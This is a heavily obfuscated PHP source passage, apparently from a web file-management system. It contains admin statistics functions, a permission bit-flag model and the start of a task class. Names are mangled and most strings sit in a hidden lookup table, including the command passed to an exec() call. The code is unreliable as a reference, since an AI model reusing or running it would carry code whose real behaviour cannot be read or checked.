(isset($ı¿ùÃáã[$ûâ‡àú›])) { $»”‹ù‚Ë = $ı¿ùÃáã[$ûâ‡àú›]; } else { $»”‹ù‚Ë = end($ï“£éÖÔ); $»”‹ù‚Ë[$­³ë¤²Ÿ[224]] = $ûâ‡àú›; if ($†ã©£Şá == $­³ë¤²Ÿ[608]) { $»”‹ù‚Ë[$­³ë¤²Ÿ[1767]] = $»”‹ù‚Ë[$­³ë¤²Ÿ[1768]] = 0; } } $’Ù‰í£ğ[] = $»”‹ù‚Ë; } $ï“£éÖÔ = $’Ù‰í£ğ; } $æ‰ÙÅˆš = array($­³ë¤²Ÿ[608] => array($­³ë¤²Ÿ[780] => LNG($­³ë¤²Ÿ[1783]), $­³ë¤²Ÿ[1767] => LNG($­³ë¤²Ÿ[1784]), $­³ë¤²Ÿ[1768] => LNG($­³ë¤²Ÿ[1785])), $­³ë¤²Ÿ[1769] => array($­³ë¤²Ÿ[778] => LNG($­³ë¤²Ÿ[1786]), $­³ë¤²Ÿ[1771] => LNG($­³ë¤²Ÿ[1787]), $­³ë¤²Ÿ[1772] => LNG($­³ë¤²Ÿ[1788]), $­³ë¤²Ÿ[1773] => LNG($­³ë¤²Ÿ[1789]))); $¼ÉÁİš­ = array($­³ë¤²Ÿ[608] => $­³ë¤²Ÿ[1790], $­³ë¤²Ÿ[1769] => $­³ë¤²Ÿ[76]); if (empty($ï“£éÖÔ)) { $ûâ‡àú› = date($­³ë¤²Ÿ[1774], strtotime($­³ë¤²Ÿ[1775])); $ƒ†ïıÙ = array($­³ë¤²Ÿ[224] => $ûâ‡àú›); foreach ($æ‰ÙÅˆš[$†ã©£Şá] as $–‰š½×® => $½´ì­Œ†) { $ƒ†ïıÙ[$–‰š½×®] = 0; } $ï“£éÖÔ[] = $ƒ†ïıÙ; } $ª”¶ÑÄÔ = array(); foreach ($ï“£éÖÔ as $½´ì­Œ†) { if ($†ã©£Şá == $­³ë¤²Ÿ[1769] && $½´ì­Œ†[$­³ë¤²Ÿ[1771]] > $½´ì­Œ†[$­³ë¤²Ÿ[778]]) { $½´ì­Œ†[$­³ë¤²Ÿ[1771]] = $½´ì­Œ†[$­³ë¤²Ÿ[778]]; } foreach ($æ‰ÙÅˆš[$†ã©£Şá] as $–‰š½×® => $äÔ”Ë) { $»”‹ù‚Ë = array($­³ë¤²Ÿ[224] => $½´ì­Œ†[$­³ë¤²Ÿ[224]], $­³ë¤²Ÿ[1564] => $äÔ”Ë); $»”‹ù‚Ë[$¼ÉÁİš­[$†ã©£Şá]] = isset($½´ì­Œ†[$–‰š½×®]) ? $½´ì­Œ†[$–‰š½×®] : 0; $ª”¶ÑÄÔ[] = $»”‹ù‚Ë; } } return $ª”¶ÑÄÔ; } public function validDate($ï«¤ßé, $¡±ÅŸ…–) { $¼‰÷’°˜ =& $_SERVER[™¾ÇÙ¯¹]; $·ïƒó = date($¼‰÷’°˜[1774], strtotime($¼‰÷’°˜[1775])); $Š»Ô“„‰ = array($·ïƒó); switch ($ï«¤ßé) { case $¼‰÷’°˜[1645]: $é³ŸÛì = mktime(0, 0, 0, date($¼‰÷’°˜[1791]), date($¼‰÷’°˜[1383]) - date($¼‰÷’°˜[1446]) + 7 - 7, date($¼‰÷’°˜[1792])); $ìöó§›Š = 0; do { $¢Éª÷¥‰ = date($¼‰÷’°˜[1774], $é³ŸÛì - 3600 * 24 * 7 * $ìöó§›Š); $Š»Ô“„‰[] = $¢Éª÷¥‰; $ìöó§›Š++; } while ($¡±ÅŸ…– < $¢Éª÷¥‰); break; case $¼‰÷’°˜[1643]: $ìöó§›Š = 1; do { $ôöÃ“ıß = date($¼‰÷’°˜[1793], strtotime("\x2d\x20{$ìöó§›Š}\x20\155\157\x6e\164\150\x73")); $Š»Ô“„‰[] = $ôöÃ“ıß; $ìöó§›Š++; } while ($¡±ÅŸ…– < $ôöÃ“ıß); break; case $¼‰÷’°˜[1794]: $ÊŒ¸å¼‹ = (int) date($¼‰÷’°˜[1792], strtotime($¡±ÅŸ…–)); $ËÔ æ¶¡ = (int) date($¼‰÷’°˜[1792]); if ($ÊŒ¸å¼‹ >= $ËÔ æ¶¡) { break; } for ($ÊŒ¸å¼‹; $ÊŒ¸å¼‹ < $ËÔ æ¶¡; $ÊŒ¸å¼‹++) { $Š»Ô“„‰[] = $ÊŒ¸å¼‹ . $¼‰÷’°˜[1795]; } break; default: break; } if ($¡±ÅŸ…– > end($Š»Ô“„‰)) { array_pop($Š»Ô“„‰); } sort($Š»Ô“„‰); return $Š»Ô“„‰; } public function listTable($ö¿Õûüú) { $»Ö’—ğÌ = ucfirst($ö¿Õûüú); return Model($»Ö’—ğÌ)->listData(); } public function option($øÕŠÛ¾) { $Ó´¦ é = $_SERVER[™¾ÇÙ¯¹][1796] . ucfirst($øÕŠÛ¾); return $this->{$Ó´¦ é}(); } private function optionUser() { $Í›³òŸ£ =& $_SERVER[™¾ÇÙ¯¹]; $£Ú†ÂÊÖ = Model($Í›³òŸ£[543])->count($Í›³òŸ£[1665]); $È†ªµá² = Model($Í›³òŸ£[543])->where($Í›³òŸ£[1797])->count($Í›³òŸ£[1665]); $ğäş”–É = intval($GLOBALS[$Í›³òŸ£[6]][$Í›³òŸ£[358]][$Í›³òŸ£[1620]]) / 3600; $§ØµøŒÓ = strtotime("\x2d{$ğäş”–É}\x20\150\157\x75\162\x73"); $åéß³ÓÓ = strtotime(date($Í›³òŸ£[1778])); if ($§ØµøŒÓ < $åéß³ÓÓ) { $§ØµøŒÓ = $åéß³ÓÓ; } $…šÍ•äÆ = array($Í›³òŸ£[1798] => array($Í›³òŸ£[1022], $§ØµøŒÓ)); $‹­ÂÚ¤ = (int) Model($Í›³òŸ£[543])->where($…šÍ•äÆ)->count($Í›³òŸ£[1665]); if (!$‹­ÂÚ¤) { $‹­ÂÚ¤ = 1; } $…šÍ•äÆ = array($Í›³òŸ£[1798] => array($Í›³òŸ£[1022], $åéß³ÓÓ)); $ÈøÇ¯¼ğ = Model($Í›³òŸ£[543])->where($…šÍ•äÆ)->count($Í›³òŸ£[1665]); return array($Í›³òŸ£[774] => (int) $£Ú†ÂÊÖ, $Í›³òŸ£[1799] => (int) ($£Ú†ÂÊÖ - $È†ªµá²), $Í›³òŸ£[1800] => (int) $È†ªµá², $Í›³òŸ£[1801] => (int) $ÈøÇ¯¼ğ, $Í›³òŸ£[1802] => $‹­ÂÚ¤); } private function optionFile() { $ö‘˜Ã“¾ =& $_SERVER[™¾ÇÙ¯¹]; $ÃˆíËĞü = $this->sourceSize(); $‹ø¹¶Ğ± = $ÃˆíËĞü[$ö‘˜Ã“¾[76]]; $”º€–àŞ = $ÃˆíËĞü[$ö‘˜Ã“¾[1771]]; $Ê‹å©ÉÌ = Model($ö‘˜Ã“¾[840])->where(array($ö‘˜Ã“¾[418] => 0))->count($ö‘˜Ã“¾[410]); $è¼÷²Å = array($ö‘˜Ã“¾[418] => 0, $ö‘˜Ã“¾[200] => array($ö‘˜Ã“¾[1022], strtotime(date($ö‘˜Ã“¾[1778])))); $ÇÒ·½Ü¼ = Model($ö‘˜Ã“¾[840])->where($è¼÷²Å)->sum($ö‘˜Ã“¾[76]); $Õ½†ÄË = Model($ö‘˜Ã“¾[840])->where($è¼÷²Å)->count($ö‘˜Ã“¾[410]); return array($ö‘˜Ã“¾[778] => $‹ø¹¶Ğ±, $ö‘˜Ã“¾[1771] => $”º€–àŞ, $ö‘˜Ã“¾[1803] => $‹ø¹¶Ğ± - $”º€–àŞ, $ö‘˜Ã“¾[1804] => (int) $ÇÒ·½Ü¼, $ö‘˜Ã“¾[780] => (int) $Ê‹å©ÉÌ, $ö‘˜Ã“¾[1805] => (int) $Õ½†ÄË); } private function optionAccess() { $ÛÊòÙíµ =& $_SERVER[™¾ÇÙ¯¹]; return array($ÛÊòÙíµ[774] => $this->typeLogCnt(), $ÛÊòÙíµ[107] => $this->typeLogCnt($ÛÊòÙíµ[107]), $ÛÊòÙíµ[460] => $this->typeLogCnt($ÛÊòÙíµ[460]), $ÛÊòÙíµ[1806] => $this->typeLogCnt($ÛÊòÙíµ[1806]), $ÛÊòÙíµ[1807] => $this->typeLogCnt($ÛÊòÙíµ[1807]), $ÛÊòÙíµ[608] => $this->typeLogCnt($ÛÊòÙíµ[12], $ÛÊòÙíµ[1782])); } private function typeLogCnt($ú§ßè›¼ = '', $Ü¹•±º¦ = "\x69\144") { $õöŞ²ªÛ =& $_SERVER[™¾ÇÙ¯¹]; $¦ƒ½œöğ = array($õöŞ²ªÛ[107] => array($õöŞ²ªÛ[1808], $õöŞ²ªÛ[1809]), $õöŞ²ªÛ[460] => array($õöŞ²ªÛ[1810], $õöŞ²ªÛ[1811]), $õöŞ²ªÛ[1806] => array($õöŞ²ªÛ[1812], $õöŞ²ªÛ[1813], $õöŞ²ªÛ[1814]), $õöŞ²ªÛ[1807] => array($õöŞ²ªÛ[1815], $õöŞ²ªÛ[1816]), $õöŞ²ªÛ[1817] => array($õöŞ²ªÛ[1818], $õöŞ²ªÛ[1819], $õöŞ²ªÛ[1820])); $ë«¼ = strtotime(date($õöŞ²ªÛ[1778])); $éÀŠ¬Ôú = array($õöŞ²ªÛ[200] => array($õöŞ²ªÛ[1022], $ë«¼)); if ($ú§ßè›¼) { $éÀŠ¬Ôú[$õöŞ²ªÛ[33]] = array($õöŞ²ªÛ[7], $¦ƒ½œöğ[$ú§ßè›¼]); } $ÜóÀ‚¦œ = Model($õöŞ²ªÛ[1781])->where($éÀŠ¬Ôú)->count($Ü¹•±º¦); return (int) $ÜóÀ‚¦œ; } private function optionServer() { $ï¨Í ›Ê =& $_SERVER[™¾ÇÙ¯¹]; $ı‹…²ä = $this->diskDriver(); $¼¿Ø´èÉ = KodIO::defaultDriver(); $ó±‡¶¶™ = array($ï¨Í ›Ê[832] => $¼¿Ø´èÉ[$ï¨Í ›Ê[407]]); $Îä™‚á§ = Model($ï¨Í ›Ê[479])->where($ó±‡¶¶™)->sum($ï¨Í ›Ê[76]); $è³²Š­ñ = explode($ï¨Í ›Ê[53], $_SERVER[$ï¨Í ›Ê[143]]); $˜ÒşÁš = $è³²Š­ñ[0]; $«ˆÍàï  = $GLOBALS[$ï¨Í ›Ê[6]][$ï¨Í ›Ê[21]]; $ô“Öë¢î = $«ˆÍàï [$ï¨Í ›Ê[984]]; if ($ô“Öë¢î == $ï¨Í ›Ê[972]) { $£áˆ¬Õ§ = explode($ï¨Í ›Ê[1280], $«ˆÍàï [$ï¨Í ›Ê[983]]); $ô“Öë¢î = $£áˆ¬Õ§[0]; } if ($ô“Öë¢î == $ï¨Í ›Ê[920] || $ô“Öë¢î == $ï¨Í ›Ê[819]) { $Õ˜©àÈĞ = Model()->db()->query($ï¨Í ›Ê[1821]); $÷¶çæ—ğ = $Õ˜©àÈĞ[0] && isset($Õ˜©àÈĞ[0][$ï¨Í ›Ê[1563]]) ? $Õ˜©àÈĞ[0][$ï¨Í ›Ê[1563]] : 0; $ô“Öë¢î = $ï¨Í ›Ê[1822] . ($÷¶çæ—ğ ? $ï¨Í ›Ê[8] . $÷¶çæ—ğ : $ï¨Í ›Ê[12]); } $”„ÍÅ— = $GLOBALS[$ï¨Í ›Ê[6]][$ï¨Í ›Ê[358]][$ï¨Í ›Ê[842]]; return array($ï¨Í ›Ê[1823] => $ı‹…²ä ? $ı‹…²ä[$ï¨Í ›Ê[1824]] : 0, $ï¨Í ›Ê[1825] => $ı‹…²ä ? $ı‹…²ä[$ï¨Í ›Ê[1826]] : 0, $ï¨Í ›Ê[1827] => (int) $¼¿Ø´èÉ[$ï¨Í ›Ê[1824]] * 1024 * 1024 * 1024, $ï¨Í ›Ê[1828] => (int) $Îä™‚á§, $ï¨Í ›Ê[1829] => ucfirst($˜ÒşÁš), $ï¨Í ›Ê[1830] => $ï¨Í ›Ê[1831] . PHP_VERSION, $ï¨Í ›Ê[1832] => phpBuild64() ? 64 : 32, $ï¨Í ›Ê[773] => str_replace($ï¨Í ›Ê[1138], $ï¨Í ›Ê[1000], $ô“Öë¢î), $ï¨Í ›Ê[358] => ucfirst($”„ÍÅ—), $ï¨Í ›Ê[32] => $_SERVER[$ï¨Í ›Ê[1833]]); } private function diskDriver() { $¬ ’ßìÕ =& $_SERVER[™¾ÇÙ¯¹]; $ÖåÃíÌ± = $¬ ’ßìÕ[8]; $†ĞÕÇ‡§ = $GLOBALS[$¬ ’ßìÕ[6]][$¬ ’ßìÕ[1296]] == $¬ ’ßìÕ[1297]; if ($†ĞÕÇ‡§) { $ÖåÃíÌ± = $¬ ’ßìÕ[1834]; if (function_exists($¬ ’ßìÕ[1835])) { exec($¬ ’ßìÕ[1836], $‘ØÔ—â—); $ÖåÃíÌ± = $‘ØÔ—â—[1] . $¬ ’ßìÕ[8]; } } if (!file_exists($ÖåÃíÌ±)) { return; } $ñøù±Õã = @disk_total_space($ÖåÃíÌ±); $Äè¼¶¿¢ = $ñøù±Õã - @disk_free_space($ÖåÃíÌ±); return array($¬ ’ßìÕ[1824] => $ñøù±Õã, $¬ ’ßìÕ[1826] => $Äè¼¶¿¢); } public function fileChart($õÏÓÔêÛ) { $‹…½–âÅ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($õÏÓÔêÛ[$‹…½–âÅ[1665]])) { return Model($‹…½–âÅ[840])->userFileTypeProfile($õÏÓÔêÛ[$‹…½–âÅ[1665]]); } if (isset($õÏÓÔêÛ[$‹…½–âÅ[1837]])) { return Model($‹…½–âÅ[840])->groupFileTypeProfile($õÏÓÔêÛ[$‹…½–âÅ[1837]]); } $ğûÏ¶âÎ = $this->sourceSize(); $í‰Ş–š  = array($‹…½–âÅ[440] => 0, $‹…½–âÅ[419] => 1); $ÑÆøÛ½ = Model($‹…½–âÅ[840])->where($í‰Ş–š )->sum($‹…½–âÅ[76]); $í‰Ş–š [$‹…½–âÅ[419]] = 2; $—óó —É = Model($‹…½–âÅ[840])->where($í‰Ş–š )->sum($‹…½–âÅ[76]); return array($‹…½–âÅ[778] => $ğûÏ¶âÎ[$‹…½–âÅ[76]], $‹…½–âÅ[1771] => $ğûÏ¶âÎ[$‹…½–âÅ[1771]], $‹…½–âÅ[1772] => (int) $ÑÆøÛ½, $‹…½–âÅ[1773] => (int) $—óó —É); } private function sourceSize() { $ñî±­Ğ =& $_SERVER[™¾ÇÙ¯¹]; $ÔÆ¡ÍÃï = Model($ñî±­Ğ[840])->where(array($ñî±­Ğ[418] => 0))->sum($ñî±­Ğ[76]); $û»•ç§„ = Model($ñî±­Ğ[479])->sum($ñî±­Ğ[76]); if ($û»•ç§„ > $ÔÆ¡ÍÃï) { $û»•ç§„ = $ÔÆ¡ÍÃï; } return array($ñî±­Ğ[76] => (int) $ÔÆ¡ÍÃï, $ñî±­Ğ[1771] => (int) $û»•ç§„); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ç”üÕšı =& $_SERVER[™¾ÇÙ¯¹]; $»¨‰¡¿Ò = array(array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1838]), $Ç”üÕšı[1839] => $Ç”üÕšı[1840], $Ç”üÕšı[1841] => 1, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1844]), $Ç”üÕšı[1839] => $Ç”üÕšı[1845], $Ç”üÕšı[1841] => 2, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1846]), $Ç”üÕšı[1839] => $Ç”üÕšı[1847], $Ç”üÕšı[1841] => 3, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1848]), $Ç”üÕšı[1839] => $Ç”üÕšı[1849], $Ç”üÕšı[1841] => 4, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1850]), $Ç”üÕšı[1839] => $Ç”üÕšı[1851], $Ç”üÕšı[1841] => 5, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1852]), $Ç”üÕšı[1839] => $Ç”üÕšı[1853], $Ç”üÕšı[1841] => 6, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ç”üÕšı[428] => LNG($Ç”üÕšı[1854]), $Ç”üÕšı[1839] => $Ç”üÕšı[1855], $Ç”üÕšı[1841] => 7, $Ç”üÕšı[1842] => 1, $Ç”üÕšı[1843] => 0)); return $»¨‰¡¿Ò; } public static function authCheck($ÁäŠÀ¨Ó, $Æ†’ÓÇ¸) { $Ã„åŠ½… =& $_SERVER[™¾ÇÙ¯¹]; $ÁäŠÀ¨Ó = intval($ÁäŠÀ¨Ó); if ($GLOBALS[$Ã„åŠ½…[511]] && $GLOBALS[$Ã„åŠ½…[6]][$Ã„åŠ½…[1856]]) { return !0; } if ($ÁäŠÀ¨Ó <= 0) { return !1; } if (($ÁäŠÀ¨Ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÁäŠÀ¨Ó & $Æ†’ÓÇ¸); } public static function authCheckShow($‘õÁğß§) { return self::authCheck($‘õÁğß§, self::AUTH_SHOW); } public static function authCheckView($¢«µÖªÚ) { return self::authCheck($¢«µÖªÚ, self::AUTH_VIEW); } public static function authCheckDownload($°î×ë•Ä) { return self::authCheck($°î×ë•Ä, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÄÎ–ê¼¿) { return self::authCheck($ÄÎ–ê¼¿, self::AUTH_UPLOAD); } public static function authCheckEdit($°Ò‚­Ã¶) { return self::authCheck($°Ò‚­Ã¶, self::AUTH_EDIT); } public static function authCheckRemove($Ç¢ÙÃ½) { return self::authCheck($Ç¢ÙÃ½, self::AUTH_REMOVE); } public static function authCheckShare($èïÚÜ¡Å) { return self::authCheck($èïÚÜ¡Å, self::AUTH_SHARE); } public static function authCheckComment($µäëÚì) { return self::authCheck($µäëÚì, self::AUTH_COMMENT); } public static function authCheckEvent($‘ßışí) { return self::authCheck($‘ßışí, self::AUTH_EVENT); } public static function authCheckRoot($¦‚Öï°Å) { return self::authCheck($¦‚Öï°Å, self::AUTH_ROOT); } public static function authCheckAction($­ÔœÄ•ã, $î£ÃÉû£) { $½æòöÃ =& $_SERVER[™¾ÇÙ¯¹]; $› èÔÙø = array($½æòöÃ[1857] => self::AUTH_VIEW, $½æòöÃ[1207] => self::AUTH_DOWNLOAD, $½æòöÃ[107] => self::AUTH_UPLOAD, $½æòöÃ[1807] => self::AUTH_EDIT, $½æòöÃ[1806] => self::AUTH_REMOVE, $½æòöÃ[1817] => self::AUTH_SHARE, $½æòöÃ[363] => self::AUTH_COMMENT, $½æòöÃ[1653] => self::AUTH_EVENT, $½æòöÃ[1858] => self::AUTH_ROOT); if (!isset($› èÔÙø[$î£ÃÉû£])) { return; } $ªŸ……¤ = $› èÔÙø[$î£ÃÉû£]; $­ÔœÄ•ã = intval($­ÔœÄ•ã); if ($­ÔœÄ•ã <= 0) { return !1; } if (($­ÔœÄ•ã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($­ÔœÄ•ã & $ªŸ……¤); } public static function authDisable($½´±õÓ¼, $šÏ§§’¤) { if (intval($½´±õÓ¼) <= 0) { return 0; } return intval($½´±õÓ¼) & ~$šÏ§§’¤; } public $optionType = "\123\x79\163\x74\145\155\x2e\163\157\x75\x72\x63\145\x41\x75\164\x68\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\x70\154\141\171", "\x73\x79\163\x74\145\155", "\163\x6f\162\164"); public function initData() { $€»öì® = $this->authDefault(); foreach ($€»öì® as $õ•¨âÈ) { $this->add($õ•¨âÈ); } } public function findAuth($ùØ¥ïùÀ, $ä€§Ãş…) { $¤ÜëÈò =& $_SERVER[™¾ÇÙ¯¹]; $è¬„‘áæ = parent::listData(); foreach ($è¬„‘áæ as $“œ™½Ê“) { $™ŸÎÏÇ‡ = intval($“œ™½Ê“[$¤ÜëÈò[421]]); if ($™ŸÎÏÇ‡ <= 0 || $“œ™½Ê“[$¤ÜëÈò[1859]] == 0) { continue; } if (($™ŸÎÏÇ‡ & $ùØ¥ïùÀ) != $ùØ¥ïùÀ) { continue; } if (($™ŸÎÏÇ‡ & $ä€§Ãş…) != 0) { continue; } return $“œ™½Ê“[$¤ÜëÈò[407]]; } return !1; } public function findAuthReadOnly() { $ËÃ‹ÊÆª = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $üÁüÆ‰Ø = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ËÃ‹ÊÆª, $üÁüÆ‰Ø); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $¤Ş‘·Ù =& $_SERVER[™¾ÇÙ¯¹]; $ÇÑƒ£ë« = parent::listData(); $¢›ƒ…ĞÆ = !1; foreach ($ÇÑƒ£ë« as $ïÖ´Ùå) { if ($ïÖ´Ùå[$¤Ş‘·Ù[421]] <= 0 || $ïÖ´Ùå[$¤Ş‘·Ù[1859]] == $¤Ş‘·Ù[197]) { continue; } if (!$¢›ƒ…ĞÆ) { $¢›ƒ…ĞÆ = $ïÖ´Ùå; continue; } if ($¢›ƒ…ĞÆ[$¤Ş‘·Ù[421]] > $ïÖ´Ùå[$¤Ş‘·Ù[421]]) { $¢›ƒ…ĞÆ = $ïÖ´Ùå; } } return $¢›ƒ…ĞÆ ? $¢›ƒ…ĞÆ[$¤Ş‘·Ù[407]] : $¤Ş‘·Ù[12]; } public function listData($³‘²Üª = false, $ÏÛÇî£Ú = "\x73\x6f\162\x74", $İÏõ‰×± = false) { return parent::listData($³‘²Üª, $ÏÛÇî£Ú, $İÏõ‰×±); } public function update($‚ùôÇĞæ, $±ê·‰ô) { $û¢…ñË• =& $_SERVER[™¾ÇÙ¯¹]; $Ú±¬Åé¼ = parent::listData($‚ùôÇĞæ); $ØÀèä­€ = $this->findByName($±ê·‰ô[$û¢…ñË•[32]]); if (!$Ú±¬Åé¼ || $ØÀèä­€ && $ØÀèä­€[$û¢…ñË•[407]] != $Ú±¬Åé¼[$û¢…ñË•[407]]) { return !1; } $this->filterAuth($±ê·‰ô[$û¢…ñË•[421]]); return parent::update($‚ùôÇĞæ, $±ê·‰ô); } public function remove($èåŠñ­‚) { $—ïñ—›Ó = parent::listData($èåŠñ­‚); if (!$—ïñ—›Ó || $—ïñ—›Ó[$_SERVER[™¾ÇÙ¯¹][1284]]) { return !1; } return parent::remove($èåŠñ­‚); } public function add($€îâ•£ = array()) { $¥’’Úøè =& $_SERVER[™¾ÇÙ¯¹]; if ($this->findByName($€îâ•£[$¥’’Úøè[32]])) { return !1; } $Éüåú‡¨ = array($¥’’Úøè[32] => $¥’’Úøè[12], $¥’’Úøè[421] => 1, $¥’’Úøè[1860] => $¥’’Úøè[1847], $¥’’Úøè[1859] => 1, $¥’’Úøè[1284] => 0, $¥’’Úøè[1861] => 0); $€îâ•£ = array_merge($Éüåú‡¨, $€îâ•£); $€îâ•£[$¥’’Úøè[1861]] = $this->getSort(); $this->filterAuth($€îâ•£[$¥’’Úøè[421]]); return parent::insert($€îâ•£); } private function getSort() { $¶˜ ™õ =& $_SERVER[™¾ÇÙ¯¹]; $¿¨‚ºùŸ = parent::listData(); $È´Úø÷ = array_to_keyvalue($¿¨‚ºùŸ, $¶˜ ™õ[12], $¶˜ ™õ[1861]); return empty($È´Úø÷) ? 0 : max($È´Úø÷) + 1; } private function filterAuth(&$§Ñà‡Öú) { if (!$§Ñà‡Öú) { return; } $’şŠêŞ¯ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Î°ä¼©° = array(); foreach ($’şŠêŞ¯ as $ÙİñÚÑ„) { if ($§Ñà‡Öú & $ÙİñÚÑ„) { $Î°ä¼©°[] = $ÙİñÚÑ„; } } if (in_array(self::AUTH_ROOT, $Î°ä¼©°)) { $§Ñà‡Öú = array_sum($’şŠêŞ¯); return; } $×¬²’´™ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Î°ä¼©° as $ÙİñÚÑ„) { if (isset($×¬²’´™[$ÙİñÚÑ„])) { $Î°ä¼©° = array_merge($Î°ä¼©°, $×¬²’´™[$ÙİñÚÑ„]); } } $Î°ä¼©°[] = self::AUTH_SHOW; $§Ñà‡Öú = array_sum(array_unique($Î°ä¼©°)); } public function sort($‘ã†‘ªæ, $Å‰Ÿ £¯) { return parent::update($‘ã†‘ªæ, $Å‰Ÿ £¯); } } goto d•…Ğ§ø÷—; dÂºãÜÁœÛ: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($ÔØù½»Ú, $¡ÏÀ©Ó = '', $õ©ù²ğÕ = 0, $Õœè±Ï = '') { $´í¡¤½ =& $_SERVER[™¾ÇÙ¯¹]; if (self::get($ÔØù½»Ú)) { return; } $this->task = array($´í¡¤½[407] => $ÔØù½»Ú, $´í¡¤½[1665] => USER_ID, $´í¡¤½[1564] => $Õœè±Ï, $´í¡¤½[33] => $¡ÏÀ©Ó, $´í¡¤½[1072] => $´í¡¤½[12], $´í¡¤½[801] => $õ©ù²ğÕ, $´í¡¤½[1666] => 0, $´í¡¤½[1667] => 0, $´í¡¤½[1668] => 0, $´í¡¤½[1669] => timeFloat(), $´í¡¤½[1670] => 0, $´í¡¤½[1671] => 0, $´í¡¤½[1672] => 0, $´í¡¤½[1673] => 0, $´í¡¤½[765] => $´í¡¤½[1624]); $GLOBALS[$´í¡¤½[1674]] = 1; Hook::bind($´í¡¤½[1629], array($this, $´í¡¤½[1675])); Hook::bind($´í¡¤½[1676], array($this, $´í¡¤½[1677])); $this->startAfter(); Hook::trigger($´í¡¤½[1678], $this->task); $this->task[$´í¡¤½[1671]] = timeFloat(); } public function end() { $æ¶æªªÙ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->task) { return; } if ($this->task[$æ¶æªªÙ[1671]]) { self::valueSet($this->task[$æ¶æªªÙ[407]], !1); } $Êòôñéš = timeFloat() - $this->task[$æ¶æªªÙ[1669]]; self::log($æ¶æªªÙ[1679] . $this->task[$æ¶æªªÙ[407]] . $æ¶æªªÙ[1680] . $Êòôñéš . $æ¶æªªÙ[1681]); Hook::unbind($æ¶æªªÙ[1629], array($this, $æ¶æªªÙ[1675])); Hook::unbind($æ¶æªªÙ[1676], array($this, $æ¶æªªÙ[1677])); $this->endAfter(); $this->task = !1; } public function update($ªğ—«×Ş = 0, $ÅßËÉ‹´ = false) { $Ø‚øÂ¥½ =& $_SERVER[™¾ÇÙ¯¹]; $ÜÚñ©Â¬ =& $this->task; if (!$ÜÚñ©Â¬) { return; } $ÜÚñ©Â¬[$Ø‚øÂ¥½[1666]] += $ªğ—«×Ş; $ÜÚñ©Â¬[$Ø‚øÂ¥½[1670]] = timeFloat(); if ($ÜÚñ©Â¬[$Ø‚øÂ¥½[801]]) { if ($ÜÚñ©Â¬[$Ø‚øÂ¥½[801]] < $ÜÚñ©Â¬[$Ø‚øÂ¥½[1666]]) { $ÜÚñ©Â¬[$Ø‚øÂ¥½[801]] = $ÜÚñ©Â¬[$Ø‚øÂ¥½[1666]]; } $œ½¢¥§’ = timeFloat() - $ÜÚñ©Â¬[$Ø‚øÂ¥½[1669]] - $ÜÚñ©Â¬[$Ø‚øÂ¥½[1672]]; if ($œ½¢¥§’ <= 0) { $œ½¢¥§’ = 0.001; } $ÜÚñ©Â¬[$Ø‚øÂ¥½[1667]] = $ÜÚñ©Â¬[$Ø‚øÂ¥½[1666]] / 